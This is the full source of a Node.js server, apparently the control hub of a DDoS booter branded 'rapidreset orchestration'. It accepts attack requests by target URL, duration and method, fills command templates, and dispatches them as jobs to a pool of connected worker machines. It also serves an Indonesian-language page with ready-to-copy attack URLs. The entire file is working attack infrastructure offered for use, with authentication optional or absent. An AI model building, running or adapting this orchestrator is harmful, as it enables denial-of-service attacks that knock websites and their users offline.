const http = require('node:http');
const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const port = Number(process.env.PORT || process.env.SERVER_PORT || 3295);
const host = process.env.HOST || '0.0.0.0';
const clientToken = process.env.CLIENT_TOKEN || '';
const methodsFile = path.join(__dirname, 'method.json');
const maxAttackTime = 300;
const maxQueuedJobs = 32;
const jobTimeoutMs = 60_000;
const color = supportsColor();
let isShuttingDown = false;

function supportsColor() {
    if (process.env.NO_COLOR) {
        return false;
    }
    if (process.env.FORCE_COLOR) {
        return true;
    }
    return process.stdout.isTTY === true;
}

function sgr(code) {
    return (text) => (color ? `\u001b[${code}m${text}\u001b[0m` : String(text));
}

const paint = {
    dim: sgr('2'),
    bold: sgr('1'),
    red: sgr('38;5;203'),
    green: sgr('38;5;114'),
    yellow: sgr('38;5;179'),
    blue: sgr('38;5;110'),
    purple: sgr('38;5;176'),
    gy: sgr('38;5;108'),
    pg: sgr('38;5;216'),
    op: sgr('38;5;152'),
};

function gradient(text) {
    if (!color) {
        return text;
    }

    const stops = [
        [56, 189, 248],
        [129, 140, 248],
        [192, 132, 252],
        [244, 114, 182],
    ];
    const chars = [...text];

    return chars
        .map((char, index) => {
            if (char === ' ') {
                return char;
            }
            const position = chars.length === 1 ? 0 : (index / (chars.length - 1)) * (stops.length - 1);
            const left = Math.min(Math.floor(position), stops.length - 2);
            const mix = position - left;
            const rgb = stops[left].map((from, channel) => Math.round(from + (stops[left + 1][channel] - from) * mix));
            return `\u001b[38;2;${rgb.join(';')}m${char}`;
        })
        .join('') + '\u001b[0m';
}

function clock() {
    return new Date().toISOString().slice(11, 19);
}

function log(tag, message) {
    console.log(`${paint.dim(clock())}  ${tag}  ${message}`);
}

if (!Number.isInteger(port) || port < 1 || port > 65535) {
    throw new Error('PORT must be an integer between 1 and 65535');
}

let methods = {};

try {
    for (const entry of JSON.parse(fs.readFileSync(methodsFile, 'utf8'))) {
        if (entry && typeof entry.name === 'string' && typeof entry.command === 'string') {
            methods[entry.name] = entry.command;
        }
    }
} catch (error) {
    console.warn(`${paint.yellow('warn')}  method.json: ${error.message}`);
}

// job: { id, name, target, time, method, command, queuedAt, workerId, receivedAt, exitCode, output }
const jobs = new Map();
const pending = [];
// workerId: { id, name, version, connectedAt, currentJobId }
const workers = new Map();
const waiters = new Map();

function sendJson(response, status, body, headers = {}) {
    const payload = JSON.stringify(body);
    response.writeHead(status, {
        'content-type': 'application/json; charset=utf-8',
        'content-length': Buffer.byteLength(payload),
        'cache-control': 'no-store',
        'x-content-type-options': 'nosniff',
        ...headers,
    });
    response.end(payload);
}

function single(searchParams, name) {
    const values = searchParams.getAll(name);
    return values.length === 1 ? values[0] : undefined;
}

function readJsonBody(request, limit = 8 * 1024) {
    return new Promise((resolve, reject) => {
        let size = 0;
        const chunks = [];

        request.on('data', (chunk) => {
            size += chunk.length;
            if (size > limit) {
                reject(new Error('Request body too large'));
                request.destroy();
                return;
            }
            chunks.push(chunk);
        });

        request.on('end', () => {
            if (chunks.length === 0) {
                resolve({});
                return;
            }
            try {
                resolve(JSON.parse(Buffer.concat(chunks).toString('utf8')));
            } catch {
                reject(new Error('Body must be JSON'));
            }
        });

        request.on('error', reject);
    });
}

function buildCommand(name, target, duration, method) {
    const command = methods[name];
    const values = { '<<host>>': target, '<<time>>': String(duration), '<<method>>': method };

    return command.replace(/<<[a-zA-Z]+>>/g, (token) => {
        if (!Object.hasOwn(values, token)) {
            throw new Error(`Unknown placeholder ${token} in method "${name}"`);
        }
        return values[token];
    });
}

function isValidTarget(value) {
    if (/\s/.test(value)) {
        return false;
    }

    try {
        const parsed = new URL(value);
        return parsed.protocol === 'http:' || parsed.protocol === 'https:';
    } catch {
        return false;
    }
}

function isValidMethod(method) {
    return typeof method === 'string' && /^[A-Za-z0-9_-]{1,64}$/.test(method) && Object.hasOwn(methods, method);
}

function isValidDuration(value) {
    if (!/^\d{1,5}$/.test(value)) {
        return false;
    }

    const duration = Number(value);
    return duration >= 1 && duration <= maxAttackTime;
}

function tokenMatches(value) {
    if (!clientToken) {
        return true;
    }
    if (typeof value !== 'string') {
        return false;
    }

    const expected = Buffer.from(clientToken);
    const actual = Buffer.from(value);
    return expected.length === actual.length && crypto.timingSafeEqual(expected, actual);
}

function isIdleWorker(worker) {
    return worker.currentJobId === null && !hasWaiter(worker.id);
}

function hasWaiter(workerId) {
    return waiters.has(workerId);
}

function pickIdleWorker(excludeWorkerId) {
    for (const worker of workers.values()) {
        if (worker.id !== excludeWorkerId && isIdleWorker(worker)) {
            return worker;
        }
    }
    return null;
}

function dispatch() {
    while (pending.length > 0) {
        const worker = pickIdleWorker();
        if (!worker) {
            return;
        }

        const job = pending.shift();
        job.workerId = worker.id;
        worker.currentJobId = job.id;
        job.timer = setTimeout(() => failJob(job, `Worker ${worker.id} did not finish the job in time`), jobTimeoutMs);
        log(
            paint.blue('job'),
            `${paint.dim(job.id.slice(0, 8))} ${paint.gy('->')} ${worker.id}  ${paint.pg(job.name)} ${job.target} ${job.time}s`,
        );
    }
}

function failJob(job, message) {
    if (job.timer) {
        clearTimeout(job.timer);
        job.timer = null;
    }
    if (job.done) {
        return;
    }

    job.done = true;
    const waiter = waiters.get(job.workerId);
    if (waiter) {
        waiters.delete(job.workerId);
        clearTimeout(waiter.timer);
        waiter.orchestrator = null;
        waiter.send({ type: 'job', job: null, error: message });
    }

    const worker = workers.get(job.workerId);
    if (worker && worker.currentJobId === job.id) {
        worker.currentJobId = null;
    }

    job.status = 'error';
    job.error = message;
    job.finishedAt = Date.now();
    jobs.delete(job.id);
    log(paint.red('job'), `${paint.dim(job.id.slice(0, 8))} failed  ${paint.red(message)}`);
}

function finishJob(job, exitCode, output) {
    if (job.timer) {
        clearTimeout(job.timer);
        job.timer = null;
    }
    if (job.done) {
        return;
    }

    job.done = true;
    job.status = exitCode === 0 ? 'done' : 'failed';
    job.exitCode = exitCode;
    job.output = typeof output === 'string' ? output.slice(-4000) : '';
    job.finishedAt = Date.now();

    const worker = workers.get(job.workerId);
    if (worker && worker.currentJobId === job.id) {
        worker.currentJobId = null;
    }

    jobs.delete(job.id);
    const elapsed = `${((job.finishedAt - job.queuedAt) / 1000).toFixed(1)}s`;
    const tag = job.status === 'done' ? paint.green('job') : paint.red('job');
    const verdict = job.status === 'done' ? paint.green('done') : paint.red('failed');
    log(tag, `${paint.dim(job.id.slice(0, 8))} ${verdict}  ${paint.dim(`exit=${exitCode} ${elapsed}`)}`);
    dispatch();
}

function publicWorker(worker) {
    return {
        id: worker.id,
        name: worker.name,
        version: worker.version,
        connectedAt: worker.connectedAt,
        currentJobId: worker.currentJobId,
    };
}

function removeWorker(workerId) {
    const worker = workers.get(workerId);
    if (!worker) {
        return;
    }
    workers.delete(workerId);
    log(paint.yellow('worker down'), workerId);

    const waiter = waiters.get(workerId);
    if (waiter) {
        waiters.delete(workerId);
        clearTimeout(waiter.timer);
        waiter.orchestrator = null;
        waiter.send({ type: 'job', job: null, error: 'Worker disconnected' });
    }

    if (worker.currentJobId) {
        const job = jobs.get(worker.currentJobId);
        if (job) {
            failJob(job, 'Worker disconnected before finishing the job');
        }
    }

    dispatch();
}

function handleWorkerSocket(socket, request) {
    const workerId = request.headers['x-worker-id'];
    if (typeof workerId !== 'string' || !/^[A-Za-z0-9_-]{1,64}$/.test(workerId)) {
        socket.end('HTTP/1.1 400 Bad Request\r\nconnection: close\r\n\r\n');
        return;
    }

    if (!tokenMatches(request.headers['x-worker-token'])) {
        socket.end('HTTP/1.1 401 Unauthorized\r\nconnection: close\r\n\r\n');
        return;
    }

    if (request.headers['sec-websocket-key']) {
        socket.end('HTTP/1.1 400 Bad Request\r\nconnection: close\r\n\r\n');
        return;
    }

    const existing = workers.get(workerId);
    if (existing && existing.socket !== socket) {
        removeWorker(workerId);
    }

    socket.setNoDelay(true);
    socket.setKeepAlive(true, 15_000);

    const worker = {
        id: workerId,
        name: request.headers['x-worker-name'] || 'unknown',
        version: request.headers['x-worker-version'] || 'unknown',
        connectedAt: Date.now(),
        currentJobId: null,
        socket,
        send(message) {
            if (!socket.destroyed) {
                socket.write(`${JSON.stringify(message)}\n`);
            }
        },
    };

    workers.set(workerId, worker);
    console.log(`${paint.dim(clock())}  ${paint.green('worker up')}   ${paint.bold(workerId)}  ${paint.dim(`${worker.name} ${worker.version}`)}`);

    socket.write('HTTP/1.1 101 Switching Protocols\r\nupgrade: worker\r\nconnection: upgrade\r\n\r\n');

    let buffer = '';

    socket.on('data', (chunk) => {
        buffer += chunk.toString('utf8');
        let newline;
        while ((newline = buffer.indexOf('\n')) !== -1) {
            const line = buffer.slice(0, newline).trim();
            buffer = buffer.slice(newline + 1);
            if (!line) {
                continue;
            }

            let message;
            try {
                message = JSON.parse(line);
            } catch {
                continue;
            }
            handleWorkerMessage(worker, message);
        }
    });

    socket.on('error', () => removeWorker(workerId));
    socket.on('close', () => removeWorker(workerId));
}

function handleWorkerMessage(worker, message) {
    if (message.type === 'hello') {
        if (typeof message.name === 'string') {
            worker.name = message.name.slice(0, 64);
        }
        if (typeof message.version === 'string') {
            worker.version = message.version.slice(0, 32);
        }
        return;
    }

    if (message.type === 'result') {
        const job = jobs.get(message.id);
        if (!job || job.workerId !== worker.id) {
            return;
        }
        finishJob(job, Number.isInteger(message.exitCode) ? message.exitCode : 1, message.output);
        return;
    }
}

async function handleAttack(request, response, searchParams) {
    if (request.method !== 'GET') {
        sendJson(response, 405, { error: 'Method not allowed' }, { allow: 'GET' });
        return;
    }

    const target = single(searchParams, 'host');
    const duration = single(searchParams, 'time') ?? single(searchParams, 'itme');
    const method = single(searchParams, 'method');

    if (!target || duration === undefined || !method) {
        sendJson(response, 400, { error: 'host, time and method are required' });
        return;
    }

    if (!isValidTarget(target)) {
        sendJson(response, 400, { error: 'host must be a valid http(s) URL without whitespace' });
        return;
    }

    if (!isValidDuration(duration)) {
        sendJson(response, 400, { error: `time must be an integer between 1 and ${maxAttackTime}` });
        return;
    }

    if (!isValidMethod(method)) {
        sendJson(response, 400, { error: `Unknown method, available: ${Object.keys(methods).join(', ') || '(none)'}` });
        return;
    }

    if (!pickIdleWorker() && pending.length >= maxQueuedJobs) {
        sendJson(response, 503, { error: 'Queue is full, try again later' }, { 'retry-after': '10' });
        return;
    }

    let command;
    try {
        command = buildCommand(method, target, duration, 'GET');
    } catch (error) {
        sendJson(response, 400, { error: error.message });
        return;
    }

    const job = {
        id: crypto.randomUUID(),
        name: method,
        target,
        time: Number(duration),
        method: 'GET',
        command,
        queuedAt: Date.now(),
        workerId: null,
        done: false,
        timer: null,
    };

    jobs.set(job.id, job);
    pending.push(job);
    dispatch();

    sendJson(response, 202, {
        ok: true,
        id: job.id,
        status: 'queued',
        method: job.name,
        host: job.target,
        time: job.time,
        statusUrl: `/api/attack/${job.id}`,
    });
}

function handleJobStatus(response, id) {
    const job = jobs.get(id);
    if (!job) {
        sendJson(response, 404, { error: 'Job not found' });
        return;
    }

    sendJson(response, 200, {
        id: job.id,
        status: job.workerId ? 'running' : 'queued',
        method: job.name,
        host: job.target,
        itme: job.time,
        workerId: job.workerId,
        queuedAt: job.queuedAt,
    });
}

async function handleWorkerSignal(request, response) {
    if (request.method !== 'POST') {
        sendJson(response, 405, { error: 'Method not allowed' }, { allow: 'POST' });
        return;
    }

    if (!tokenMatches(request.headers['x-worker-token'])) {
        sendJson(response, 401, { error: 'Unauthorized' });
        return;
    }

    let body;
    try {
        body = await readJsonBody(request);
    } catch (error) {
        sendJson(response, 400, { error: error.message });
        return;
    }

    const workerId = body.id;
    if (typeof workerId !== 'string' || !/^[A-Za-z0-9_-]{1,64}$/.test(workerId)) {
        sendJson(response, 400, { error: 'id is required' });
        return;
    }

    const previous = waiters.get(workerId);
    if (previous) {
        waiters.delete(workerId);
        clearTimeout(previous.timer);
        previous.orchestrator = null;
        previous.send({ type: 'job', job: null, error: 'Superseded by a newer signal' });
    }

    const worker = {
        id: workerId,
        token: request.headers['x-worker-token'],
        orchestrator: null,
        timer: null,
        send(message) {
            if (this.orchestrator && !this.orchestrator.destroyed) {
                this.orchestrator.write(`${JSON.stringify(message)}\n`);
            }
        },
    };

    waiters.set(workerId, worker);

    response.writeHead(200, {
        'content-type': 'application/x-ndjson; charset=utf-8',
        'cache-control': 'no-store',
        'x-content-type-options': 'nosniff',
    });

    worker.orchestrator = response;

    worker.timer = setTimeout(() => {
        const current = waiters.get(workerId);
        if (current === worker) {
            waiters.delete(workerId);
            response.destroy();
            dispatch();
        }
    }, jobTimeoutMs);

    response.on('close', () => {
        if (worker.timer) {
            clearTimeout(worker.timer);
            worker.timer = null;
        }
        const current = waiters.get(workerId);
        if (current === worker) {
            waiters.delete(workerId);
            dispatch();
        }
    });

    dispatch();
}

function route(request, response) {
    const url = new URL(request.url, 'http://localhost');
    const pathname = url.pathname;

    if (pathname === '/api/attack') {
        return handleAttack(request, response, url.searchParams);
    }

    if (pathname.startsWith('/api/attack/')) {
        if (request.method !== 'GET') {
            sendJson(response, 405, { error: 'Method not allowed' }, { allow: 'GET' });
            return undefined;
        }
        handleJobStatus(response, pathname.slice('/api/attack/'.length));
        return undefined;
    }

    if (pathname === '/api/workers') {
        if (request.method !== 'GET') {
            sendJson(response, 405, { error: 'Method not allowed' }, { allow: 'GET' });
            return undefined;
        }
        sendJson(response, 200, {
            workers: [...workers.values()].map(publicWorker),
            waiting: waiters.size,
            queued: pending.length,
        });
        return undefined;
    }

    if (pathname === '/api/worker/signal') {
        return handleWorkerSignal(request, response);
    }

    if (request.method !== 'GET' || pathname !== '/') {
        sendJson(response, request.method === 'GET' ? 404 : 405, { error: 'Not found' });
        return undefined;
    }

    const page = renderDocs(request);
    response.writeHead(200, {
        'content-type': 'text/html; charset=utf-8',
        'content-length': Buffer.byteLength(page),
        'cache-control': 'no-store',
        'x-content-type-options': 'nosniff',
    });
    response.end(page);
    return undefined;
}

function escapeHtml(value) {
    return String(value).replace(/[&<>"']/g, (char) => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;',
    })[char]);
}

function renderDocs(request) {
    const origin = `http://${request.headers.host || `${host}:${port}`}`;
    const methodNames = Object.keys(methods);
    const examples = [
        ['basic', `${origin}/api/attack?host=https://target.com&time=30&method=${methodNames[0] || 'rapidreset'}`],
        ['long run', `${origin}/api/attack?host=https://target.com&time=300&method=${methodNames[0] || 'rapidreset'}`],
        ['status', `${origin}/api/attack/<id>`],
        ['workers', `${origin}/api/workers`],
    ];

    const rows = [
        ['host', 'ya', 'URL target, wajib http(s), tanpa spasi'],
        ['time', 'ya', `durasi detik, 1-${maxAttackTime}`],
        ['method', 'ya', `salah satu: ${methodNames.join(', ') || '(kosong)'}`],
        ['itme', 'tidak', 'alias lama untuk time, masih diterima'],
    ].map(([name, required, note]) => `<tr><td><code>${escapeHtml(name)}</code></td><td>${required}</td><td>${escapeHtml(note)}</td></tr>`).join('');

    const cards = examples.map(([label, url]) => `
      <div class="card">
        <div class="label">${escapeHtml(label)}</div>
        <div class="row">
          <code class="url" data-copy>${escapeHtml(url)}</code>
          <button data-copy-btn>copy</button>
        </div>
      </div>`).join('');

    return `<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>api/attack</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body {
    margin: 0; padding: 32px 20px 64px;
    background: #0b0d10; color: #d6dae0;
    font: 14px/1.6 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
  }
  main { max-width: 880px; margin: 0 auto; }
  h1 { font-size: 18px; margin: 0 0 4px; color: #f2f4f7; letter-spacing: .02em; }
  h2 { font-size: 12px; text-transform: uppercase; letter-spacing: .12em; color: #7d8794; margin: 32px 0 10px; }
  p { margin: 0 0 10px; color: #97a1ad; }
  .endpoint { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; margin: 14px 0 0; }
  .verb { background: #1b7f4b; color: #eafff2; padding: 2px 8px; border-radius: 4px; font-size: 11px; letter-spacing: .08em; }
  table { width: 100%; border-collapse: collapse; margin-top: 6px; }
  th, td { text-align: left; padding: 8px 10px; border-bottom: 1px solid #1c2229; vertical-align: top; }
  th { color: #7d8794; font-weight: 400; font-size: 12px; text-transform: uppercase; letter-spacing: .08em; }
  code { background: #12161b; border: 1px solid #1e252d; border-radius: 4px; padding: 1px 5px; color: #9fd3ff; }
  .card { background: #101418; border: 1px solid #1c2229; border-radius: 8px; padding: 12px 14px; margin-bottom: 10px; }
  .label { font-size: 11px; text-transform: uppercase; letter-spacing: .1em; color: #6f7885; margin-bottom: 8px; }
  .row { display: flex; gap: 8px; align-items: stretch; }
  .url { flex: 1; min-width: 0; overflow-x: auto; white-space: nowrap; padding: 8px 10px; }
  button {
    flex: none; cursor: pointer; padding: 8px 14px; border-radius: 6px;
    background: #1c2229; color: #cfd6de; border: 1px solid #2a333d; font: inherit; font-size: 12px;
  }
  button:hover { background: #232b34; }
  button.done { background: #1b7f4b; border-color: #249c5c; color: #eafff2; }
  pre { background: #101418; border: 1px solid #1c2229; border-radius: 8px; padding: 12px 14px; overflow-x: auto; margin: 0; }
  .muted { color: #6f7885; }
  .warn { border-left: 2px solid #8a6b1f; padding-left: 12px; }
  a { color: #6fb3ff; }
</style>
</head>
<body>
<main>
  <h1>api/attack</h1>
  <p>Kirim job ke worker yang terhubung. Balasan langsung, eksekusi di worker.</p>

  <div class="endpoint">
    <span class="verb">GET</span>
    <code>${escapeHtml(origin)}/api/attack?host=&amp;time=&amp;method=</code>
  </div>

  <h2>Parameter</h2>
  <table>
    <tr><th>nama</th><th>wajib</th><th>keterangan</th></tr>
    ${rows}
  </table>

  <h2>Contoh</h2>
  ${cards}

  <h2>Respons 202</h2>
  <pre>{
  "ok": true,
  "id": "4b7d1c2e-...",
  "status": "queued",
  "method": "rapidreset",
  "host": "https://target.com",
  "time": 30,
  "statusUrl": "/api/attack/4b7d1c2e-..."
}</pre>

  <h2>Error</h2>
  <table>
    <tr><th>kode</th><th>arti</th></tr>
    <tr><td>400</td><td>parameter hilang / host bukan URL http(s) / time di luar rentang / method tidak dikenal</td></tr>
    <tr><td>503</td><td>antrean penuh (maks ${maxQueuedJobs} job menunggu)</td></tr>
    <tr><td>404</td><td>job tidak ditemukan atau sudah selesai</td></tr>
  </table>

  <h2>Catatan</h2>
  <p class="muted">Job dikirim ke worker pertama yang idle. Timeout per job ${jobTimeoutMs / 1000} detik.</p>
  <p class="warn muted">Endpoint ini tidak memakai autentikasi. Siapa pun yang bisa membuka URL ini bisa menjalankan job.</p>
</main>
<script>
  document.addEventListener('click', async (event) => {
    const button = event.target.closest('[data-copy-btn]');
    if (!button) return;
    const url = button.closest('.row').querySelector('[data-copy]');
    try {
      await navigator.clipboard.writeText(url.textContent.trim());
    } catch {
      const range = document.createRange();
      range.selectNodeContents(url);
      const selection = window.getSelection();
      selection.removeAllRanges();
      selection.addRange(range);
      document.execCommand('copy');
      selection.removeAllRanges();
    }
    const label = button.textContent;
    button.textContent = 'copied';
    button.classList.add('done');
    setTimeout(() => {
      button.textContent = label;
      button.classList.remove('done');
    }, 1200);
  });
</script>
</body>
</html>`;
}

const server = http.createServer(
    {
        headersTimeout: 10_000,
        requestTimeout: 0,
        maxHeaderSize: 16 * 1024,
    },
    (request, response) => {
        Promise.resolve()
            .then(() => route(request, response))
            .catch((error) => {
                console.error(`${paint.dim(clock())}  ${paint.red('error')}  request handler: ${error.message}`);
                if (!response.headersSent) {
                    sendJson(response, 500, { error: 'Internal error' });
                } else {
                    response.destroy();
                }
            });
    },
);

server.on('upgrade', (request, socket, head) => {
    const url = new URL(request.url, 'http://localhost');

    if (url.pathname !== '/api/worker') {
        socket.end('HTTP/1.1 404 Not Found\r\nconnection: close\r\n\r\n');
        return;
    }

    if (head && head.length > 0) {
        socket.unshift(head);
    }

    handleWorkerSocket(socket, request);
});

server.keepAliveTimeout = 5_000;

server.on('error', (error) => {
    console.error(`${paint.dim(clock())}  ${paint.red('error')}  server: ${error.message}`);
    process.exitCode = 1;
});

function shutdown() {
    if (isShuttingDown) {
        return;
    }

    isShuttingDown = true;
    for (const waiter of waiters.values()) {
        clearTimeout(waiter.timer);
        waiter.send({ type: 'job', job: null, error: 'Orchestrator shutting down' });
        if (waiter.orchestrator && !waiter.orchestrator.destroyed) {
            waiter.orchestrator.end();
        }
    }
    waiters.clear();

    for (const worker of workers.values()) {
        worker.socket.end();
    }

    server.close((error) => {
        if (error) {
            console.error(`${paint.dim(clock())}  ${paint.red('error')}  shutdown: ${error.message}`);
            process.exitCode = 1;
        }
    });
    server.closeIdleConnections();
}

process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);

server.listen(port, host, () => {
    const shown = host === '0.0.0.0' || host === '::' ? 'allowed-ip' : host;
    const base = `http://${shown}:${port}`;
    const kv = [
        ['orchestrator', paint.green(base)],
        ['worker', paint.blue(`${base}/api/worker`)],
        ['docs', paint.blue(base)],
        ['attack', paint.yellow(`${base}/api/attack?host=&time=&method=`)],
        ['bind', `${paint.gy(`${host}:${port}`)}  ${paint.dim(`PORT=${process.env.PORT || '-'} SERVER_PORT=${process.env.SERVER_PORT || '-'}`)}`],
        ['methods', paint.purple(Object.keys(methods).join(', ') || '(none)')],
        ['token', clientToken ? paint.green('required') : paint.dim('off')],
    ];
    const width = Math.max(...kv.map(([name]) => name.length));

    console.log('');
    console.log(`  ${gradient('rapidreset orchestration')}  ${paint.dim(`v1.0.0  node ${process.version}`)}`);
    console.log(paint.dim(`  ${'-'.repeat(width + 58)}`));
    for (const [name, value] of kv) {
        console.log(`  ${paint.dim(name.padEnd(width))}  ${value}`);
    }
    console.log(paint.dim(`  ${'-'.repeat(width + 58)}`));
    console.log(`  ${paint.dim('waiting for workers to connect...')}`);
    console.log('');
});